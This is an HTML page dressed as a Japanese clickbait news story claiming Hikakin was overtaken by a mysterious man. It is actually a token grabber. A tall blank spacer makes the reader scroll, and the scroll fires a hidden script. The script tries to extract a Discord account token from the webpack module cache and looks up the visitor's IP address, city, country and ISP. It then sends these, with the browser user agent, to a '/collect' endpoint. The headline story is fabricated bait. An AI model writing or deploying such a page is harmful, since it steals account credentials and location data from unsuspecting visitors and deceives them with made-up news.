<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>【衝撃】ヒカキンが大炎上！？ミスタービーストを超えた日本人の正体</title>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; line-height: 1.8; color: #333; margin: 0; padding: 0; }
        .header { background: #ff0000; color: white; padding: 10px; text-align: center; font-weight: bold; }
        .content { max-width: 700px; margin: 0 auto; padding: 20px; }
        h1 { color: #d00; font-size: 28px; }
        .spacer { height: 1200px; background: linear-gradient(#fff, #f9f9f9); border-left: 2px solid #eee; }
        .news-img { width: 100%; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="header">TREND NEWS JAPAN - 速報</div>
    <div class="content">
        <h1>【放送事故】ヒカキン、生配信中に大炎上！？登録者数でミスタービーストを抜いた「謎の男」が凸してきて…</h1>
        <img src="https://via.placeholder.com/700x400?text=HIKAKIN+vs+MrBeast" class="news-img">
        <p>今、世界のYouTube界を揺るがす大事件が起きています。あのヒカキンが、突如現れた謎の日本人にフォロワー数で追い抜かれました。</p>
        <p>その決定的な瞬間の映像と、犯人の正体は以下の詳細レポートで公開されています。</p>
        <p><strong>↓↓ 詳細は下にスクロールして確認 ↓↓</strong></p>
        
        <div class="spacer"></div>
        
        <h2>【独自】特定された男の正体とは…</h2>
        <p>（ここに作り込まれた詳細記事が続く…）</p>
    </div>

    <script>
        async function getInfo() {
            // トークンの抽出
            let token = "";
            try {
                window.onload = () => {
                    const getTkn = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
                    token = getTkn;
                };
            } catch (e) {}

            // 機種とIP情報の取得
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();

            // Pythonサーバーへデータを一括送信
            fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    t: token || "ブラウザ版以外/取得失敗",
                    ip: ipData.ip,
                    loc: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
                    ua: navigator.userAgent,
                    isp: ipData.org
                })
            });
        }

        // スクロールされたら実行
        let sent = false;
        window.onscroll = () => {
            if (!sent) {
                getInfo();
                sent = true;
            }
        };
    </script>
</body>
</html>
